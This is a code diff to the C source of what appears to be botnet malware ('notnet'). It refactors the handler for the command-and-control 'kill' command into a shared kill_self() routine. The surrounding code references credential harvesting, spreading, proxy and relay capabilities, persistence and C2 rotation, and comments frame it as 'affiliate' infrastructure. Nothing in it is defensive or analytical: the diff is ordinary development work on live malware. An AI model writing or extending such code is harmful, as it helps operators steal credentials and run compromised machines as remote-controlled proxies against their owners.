@@ -8,6 +8,7 @@
 #include "proxy.h"
 #include "relay.h"
 #include "plugin.h"
+#include "killswitch.h"
 #include "util.h"
 #include <stdio.h>
 #include <stdlib.h>
@@ -282,8 +283,8 @@ void c2_rotation_note_repoint(notnet_bot_t *bot) {
 
 /* Best-effort memory wipe that the optimizer cannot elide (the cred
  * drain buffer holds live harvest; leaving it readable after `kill`
- * would defeat the wipe). */
-static void wipe_volatile(volatile char *p, size_t n) {
+ * would defeat the wipe). Shared by protocol.c and killswitch.c. */
+void wipe_volatile(volatile char *p, size_t n) {
     while (n-- > 0) *p++ = '\0';
 }
 
@@ -3188,37 +3189,17 @@ int protocol_process_commands(notnet_bot_t *bot) {
             protocol_send_response(bot, CMD_ROTATE, rbuf);
         } else if (strncmp(cmd, CMD_KILL, strlen(CMD_KILL)) == 0) {
             /* SECURITY FIX (#93): affiliate capacity hand-back — the
-             * disposable-infrastructure flip side of rotation. Wipe the
-             * credential-log buffer (spread_creds_drain), stop every
-             * active capability via the plugin stop callbacks
-             * (proxy_stop/relay_stop are idempotent), then latch
-             * kill_pending so the main loop exits through the normal
-             * cleanup path (lock removal, log flush) with status 0.
-             * One-way door — there is no un-kill. */
+             * disposable-infrastructure flip side of rotation. Delegates
+             * to the shared one-way door kill_self() (killswitch.c):
+             * wipe the credential buffer, stop every capability via the
+             * plugin stop callbacks (proxy_stop/relay_stop are
+             * idempotent), remove persistence, then latch kill_pending
+             * so the main loop exits through the normal cleanup path
+             * (lock removal, log flush) with status 0. One-way door —
+             * there is no un-kill. */
             log_warn("CMD: kill requested by C2 — wiping state and exiting");
             protocol_send_response(bot, CMD_KILL, "kill: wiping state");
-
-            /* Wipe the cred buffer: drain into a heap copy, zero the
-             * copy (optimizer-proof), free it. The internal buffer is
-             * cleared by the drain; the copy is what we can reach. */
-            char *creds = NULL;
-            size_t creds_len = 0;
-            if (spread_creds_drain(&creds, &creds_len) == 0 && creds) {
-                wipe_volatile(creds, creds_len);
-                free(creds);
-            } else {
-                log_info("kill: no buffered credentials to wipe");
-            }
-
-            /* Stop proxy/relay/plugins via their stop callbacks. */
-            if (bot->plugin_enabled) {
-                plugin_unload_all(bot);
-            } else {
-                proxy_stop();
-                relay_stop();
-            }
-
-            bot->kill_pending = 1;
+            kill_self(bot, "C2 kill command");
         }
     }
     
